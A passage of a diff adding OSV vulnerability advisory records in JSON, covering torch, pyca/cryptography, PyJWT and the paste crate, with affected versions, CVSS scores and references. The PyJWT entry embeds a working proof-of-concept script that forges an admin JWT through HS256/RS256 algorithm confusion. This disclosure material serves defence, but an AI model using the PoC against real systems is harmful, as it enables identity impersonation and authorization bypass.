+        "type": "WEB",
+        "url": "https://vuldb.com/?id.302049"
+      },
+      {
+        "type": "WEB",
+        "url": "https://vuldb.com/?submit.524197"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "torch",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/torch"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.13.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "1.0.0",
+          "1.0.1",
+          "1.1.0",
+          "1.10.0",
+          "1.10.1",
+          "1.10.2",
+          "1.11.0",
+          "1.12.0",
+          "1.12.1",
+          "1.13.0",
+          "1.13.1",
+          "1.2.0",
+          "1.3.0",
+          "1.3.1",
+          "1.4.0",
+          "1.5.0",
+          "1.5.1",
+          "1.6.0",
+          "1.7.0",
+          "1.7.1",
+          "1.8.0",
+          "1.8.1",
+          "1.9.0",
+          "1.9.1",
+          "2.0.0",
+          "2.0.1",
+          "2.1.0",
+          "2.1.1",
+          "2.1.2",
+          "2.10.0",
+          "2.11.0",
+          "2.12.0",
+          "2.12.1",
+          "2.2.0",
+          "2.2.1",
+          "2.2.2",
+          "2.3.0",
+          "2.3.1",
+          "2.4.0",
+          "2.4.1",
+          "2.5.0",
+          "2.5.1",
+          "2.6.0",
+          "2.7.0",
+          "2.7.1",
+          "2.8.0",
+          "2.9.0",
+          "2.9.1"
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 2.12.1",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-rrmf-rvhw-rf47/GHSA-rrmf-rvhw-rf47.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-v8gr-m533-ghj9",
+    "summary": "Vulnerable OpenSSL included in cryptography wheels",
+    "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+    "modified": "2026-09-10T03:50:03.291941916Z",
+    "published": "2023-09-21T17:07:01Z",
+    "database_specific": {
+      "severity": "LOW",
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-09-21T17:07:01Z",
+      "nvd_published_at": null,
+      "cwe_ids": []
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-v8gr-m533-ghj9"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/fc11bce6930e591ce26a2317b31b9ce2b3e25512"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "2.5"
+              },
+              {
+                "fixed": "41.0.4"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0",
+          "39.0.1",
+          "39.0.2",
+          "40.0.0",
+          "40.0.1",
+          "40.0.2",
+          "41.0.0",
+          "41.0.1",
+          "41.0.2",
+          "41.0.3"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/09/GHSA-v8gr-m533-ghj9/GHSA-v8gr-m533-ghj9.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0"
+  },
+  {
+    "id": "GHSA-w7pp-m8wf-vj6r",
+    "summary": "Cipher.update_into can corrupt memory if passed an immutable python object as the outbuf",
+    "details": "Previously, `Cipher.update_into` would accept Python objects which implement the buffer protocol, but provide only immutable buffers:\n\n```pycon\n>>> outbuf = b\"\\x00\" * 32\n>>> c = ciphers.Cipher(AES(b\"\\x00\" * 32), modes.ECB()).encryptor()\n>>> c.update_into(b\"\\x00\" * 16, outbuf)\n16\n>>> outbuf\nb'\\xdc\\x95\\xc0x\\xa2@\\x89\\x89\\xadH\\xa2\\x14\\x92\\x84 \\x87\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n```\n\nThis would allow immutable objects (such as `bytes`) to be mutated, thus violating fundamental rules of Python. This is a soundness bug -- it allows programmers to misuse an API, it cannot be exploited by attacker controlled data alone.\n\nThis now correctly raises an exception.\n\nThis issue has been present since `update_into` was originally introduced in cryptography 1.8.",
+    "aliases": [
+      "CVE-2023-23931",
+      "PYSEC-2023-11"
+    ],
+    "modified": "2026-09-10T03:49:52.124485319Z",
+    "published": "2023-02-07T20:54:10Z",
+    "database_specific": {
+      "github_reviewed_at": "2023-02-07T20:54:10Z",
+      "nvd_published_at": "2023-02-07T21:15:00Z",
+      "cwe_ids": [
+        "CWE-754"
+      ],
+      "severity": "MODERATE",
+      "github_reviewed": true
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-w7pp-m8wf-vj6r"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-23931"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/pull/8230"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/commit/d6951dca25de45abd52da51b608055371fbcde4e"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2023-11.yaml"
+      },
+      {
+        "type": "WEB",
+        "url": "https://lists.debian.org/debian-lts-announce/2024/10/msg00012.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://security.netapp.com/advisory/ntap-20230324-0007"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "1.8"
+              },
+              {
+                "fixed": "39.0.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/02/GHSA-w7pp-m8wf-vj6r/GHSA-w7pp-m8wf-vj6r.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-x4qr-2fvf-3mr5",
+    "summary": "Vulnerable OpenSSL included in cryptography wheels",
+    "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20221213.txt and https://www.openssl.org/news/secadv/20230207.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+    "aliases": [
+      "CVE-2023-0286",
+      "PYSEC-2026-800",
+      "RUSTSEC-2023-0006"
+    ],
+    "modified": "2026-09-10T03:49:52.275131140Z",
+    "published": "2023-02-08T22:17:06Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-843"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-02-08T22:17:06Z",
+      "nvd_published_at": "2023-02-08T20:15:00Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-x4qr-2fvf-3mr5"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0286"
+      },
+      {
+        "type": "WEB",
+        "url": "https://access.redhat.com/security/cve/cve-2023-0286"
+      },
+      {
+        "type": "WEB",
+        "url": "https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-3.6.2-relnotes.txt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/018_x509.patch.sig"
+      },
+      {
+        "type": "WEB",
+        "url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9"
+      },
+      {
+        "type": "WEB",
+        "url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2f7530077e0ef79d98718138716bc51ca0cad658"
+      },
+      {
+        "type": "WEB",
+        "url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=fd2af07dc083a350c959147097003a14a5e8ac4d"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/pyca/cryptography"
+      },
+      {
+        "type": "WEB",
+        "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2023-0003"
+      },
+      {
+        "type": "WEB",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2023-0006.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://security.gentoo.org/glsa/202402-08"
+      },
+      {
+        "type": "WEB",
+        "url": "https://www.openssl.org/news/secadv/20230207.txt"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "cryptography",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/cryptography"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0.8.1"
+              },
+              {
+                "fixed": "39.0.1"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.8.1",
+          "0.8.2",
+          "0.9",
+          "0.9.1",
+          "0.9.2",
+          "0.9.3",
+          "1.0",
+          "1.0.1",
+          "1.0.2",
+          "1.1",
+          "1.1.1",
+          "1.1.2",
+          "1.2",
+          "1.2.1",
+          "1.2.2",
+          "1.2.3",
+          "1.3",
+          "1.3.1",
+          "1.3.2",
+          "1.3.3",
+          "1.3.4",
+          "1.4",
+          "1.5",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6",
+          "1.7",
+          "1.7.1",
+          "1.7.2",
+          "1.8",
+          "1.8.1",
+          "1.8.2",
+          "1.9",
+          "2.0",
+          "2.0.1",
+          "2.0.2",
+          "2.0.3",
+          "2.1",
+          "2.1.1",
+          "2.1.2",
+          "2.1.3",
+          "2.1.4",
+          "2.2",
+          "2.2.1",
+          "2.2.2",
+          "2.3",
+          "2.3.1",
+          "2.4",
+          "2.4.1",
+          "2.4.2",
+          "2.5",
+          "2.6",
+          "2.6.1",
+          "2.7",
+          "2.8",
+          "2.9",
+          "2.9.1",
+          "2.9.2",
+          "3.0",
+          "3.1",
+          "3.1.1",
+          "3.2",
+          "3.2.1",
+          "3.3",
+          "3.3.1",
+          "3.3.2",
+          "3.4",
+          "3.4.1",
+          "3.4.2",
+          "3.4.3",
+          "3.4.4",
+          "3.4.5",
+          "3.4.6",
+          "3.4.7",
+          "3.4.8",
+          "35.0.0",
+          "36.0.0",
+          "36.0.1",
+          "36.0.2",
+          "37.0.0",
+          "37.0.1",
+          "37.0.2",
+          "37.0.3",
+          "37.0.4",
+          "38.0.0",
+          "38.0.1",
+          "38.0.2",
+          "38.0.3",
+          "38.0.4",
+          "39.0.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/02/GHSA-x4qr-2fvf-3mr5/GHSA-x4qr-2fvf-3mr5.json"
+        }
+      },
+      {
+        "package": {
+          "name": "openssl-src",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/openssl-src"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "111.25.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/02/GHSA-x4qr-2fvf-3mr5/GHSA-x4qr-2fvf-3mr5.json"
+        }
+      },
+      {
+        "package": {
+          "name": "openssl-src",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/openssl-src"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "300.0.0"
+              },
+              {
+                "fixed": "300.0.12"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/02/GHSA-x4qr-2fvf-3mr5/GHSA-x4qr-2fvf-3mr5.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
+      }
+    ]
+  },
+  {
+    "id": "GHSA-xgmm-8j9v-c9wx",
+    "summary": "PyJWT: Public-key JWK accepted as HMAC secret enables forged HS256 tokens when mixed families are allowed",
+    "details": "> [!NOTE]\n> Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in `algorithms=[\u2026]` and a raw-JSON JWK as the `key=` argument, both contrary to documented usage, hence the High attack-complexity rating.\n\n### Summary\nWhen the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.   \n\n### Details\nIn JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms.\nIn pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:\n  \n`jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"])) `\n\nAn attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm. \nThe attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user. \n\nIf we look on current protections implemented in the library, at class HMACAlgorithm:\n\n```\n  def prepare_key(self, key: str | bytes) -> bytes:\n        key_bytes = force_bytes(key)\n\n        if is_pem_format(key_bytes) or is_ssh_key(key_bytes):\n            raise InvalidKeyError(\n                \"The specified key is an asymmetric key or x509 certificate and\"\n                \" should not be used as an HMAC secret.\"\n            )\n\n        return key_bytes\n```\nWe can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.\n\nIn The following example:\n`jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"])) `\nThere is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations. \n\nThe bypass happens only if the verifier:\n (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.\n\n### PoC\nPlease run the code and observe the payload printed in clear text({\"sub\":\"alice\",\"admin\":true}')\n\n```\nfrom jwt.api_jws import PyJWS\nimport json, base64, hmac, hashlib\n\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\")\n\n# Public RSA JWK (public by design)\nrsa_jwk_json = json.dumps({\"kty\":\"RSA\",\"n\":\"AQAB\",\"e\":\"AQAB\"})\n\n# Attacker-crafted token: flip to HS256 and choose claims\nheader  = b64u(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')\npayload = b64u(b'{\"sub\":\"alice\",\"admin\":true}')\nsigning = header + b\".\" + payload\n\n# Sign with HMAC using the PUBLIC JWK JSON TEXT as the \u201csecret\u201d\nsig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()\ntoken = (signing + b\".\" + b64u(sig)).decode()\n\n# Vulnerable verifier: mixed families + JWK JSON string as key\njws = PyJWS()\nprint(jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"]))\n# -> b'{\"sub\":\"alice\",\"admin\":true}'\n```\n\n\n### Impact\nUnauthenticated token forgery \u2192 full identity/role impersonation at the resource server (authorization bypass).",
+    "aliases": [
+      "CVE-2026-48526",
+      "PYSEC-2026-179"
+    ],
+    "modified": "2026-09-10T03:51:09.678127621Z",
+    "published": "2026-06-15T19:28:06Z",
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-287",
+        "CWE-347"
+      ],
+      "severity": "HIGH",
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-06-15T19:28:06Z",
+      "nvd_published_at": "2026-05-28T16:16:29Z"
+    },
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48526"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/jpadilla/pyjwt"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-179.yaml"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "pyjwt",
+          "ecosystem": "PyPI",
+          "purl": "pkg:pypi/pyjwt"
+        },
+        "ranges": [
+          {
+            "type": "ECOSYSTEM",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.13.0"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "0.1.1",
+          "0.1.2",
+          "0.1.3",
+          "0.1.4",
+          "0.1.5",
+          "0.1.6",
+          "0.1.7",
+          "0.1.8",
+          "0.1.9",
+          "0.2.0",
+          "0.2.1",
+          "0.2.3",
+          "0.3.0",
+          "0.3.1",
+          "0.3.2",
+          "0.4.0",
+          "0.4.1",
+          "0.4.2",
+          "0.4.3",
+          "1.0.0",
+          "1.0.1",
+          "1.1.0",
+          "1.3.0",
+          "1.4.0",
+          "1.4.1",
+          "1.4.2",
+          "1.5.0",
+          "1.5.1",
+          "1.5.2",
+          "1.5.3",
+          "1.6.0",
+          "1.6.1",
+          "1.6.3",
+          "1.6.4",
+          "1.7.0",
+          "1.7.1",
+          "2.0.0",
+          "2.0.0a1",
+          "2.0.0a2",
+          "2.0.1",
+          "2.1.0",
+          "2.10.0",
+          "2.10.1",
+          "2.11.0",
+          "2.12.0",
+          "2.12.1",
+          "2.2.0",
+          "2.3.0",
+          "2.4.0",
+          "2.5.0",
+          "2.6.0",
+          "2.7.0",
+          "2.8.0",
+          "2.9.0"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xgmm-8j9v-c9wx/GHSA-xgmm-8j9v-c9wx.json"
+        }
+      }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      }
+    ]
+  },
+  {
+    "id": "RUSTSEC-2024-0436",
+    "summary": "paste - no longer maintained",
+    "details": "The creator of the crate `paste` has stated in the [`README.md`](https://github.com/dtolnay/paste/blob/master/README.md) \nthat this project is not longer maintained as well as archived the repository\n\n## Possible Alternative(s)\n\n- [`pastey`]: a fork of paste and is aimed to be a drop-in replacement with additional features for paste crate\n- [`with_builtin_macros`]: crate providing a [superset of `paste`'s functionality including general `macro_rules!` eager expansions](https://docs.rs/with_builtin_macros/0.1.0/with_builtin_macros/macro.with_eager_expansions.html)  and `concat!`/`concat_idents!` macros\n\n[`pastey`]: https://crates.io/crates/pastey\n[`with_builtin_macros`]: https://crates.io/crates/with_builtin_macros",
+    "modified": "2026-01-27T22:03:15.694766Z",
+    "published": "2024-10-07T12:00:00Z",
+    "database_specific": {
+      "license": "CC0-1.0"
+    },
+    "references": [
+      {
+        "type": "PACKAGE",
+        "url": "https://crates.io/crates/paste"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://rustsec.org/advisories/RUSTSEC-2024-0436.html"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/dtolnay/paste"
+      }
+    ],
+    "affected": [
+      {
+        "package": {
+          "name": "paste",
+          "ecosystem": "crates.io",
+          "purl": "pkg:cargo/paste"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0-0"
+              }
+            ]
+          }
+        ],
+        "ecosystem_specific": {
+          "affects": {
+            "arch": [],
+            "functions": [],
+            "os": []
+          },
+          "affected_functions": null
+        },
+        "database_specific": {
+          "cvss": null,
+          "informational": "unmaintained",
+          "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0436.json",
+          "categories": []
+        }
+      }
+    ],
+    "schema_version": "1.7.3"
+  }
+]
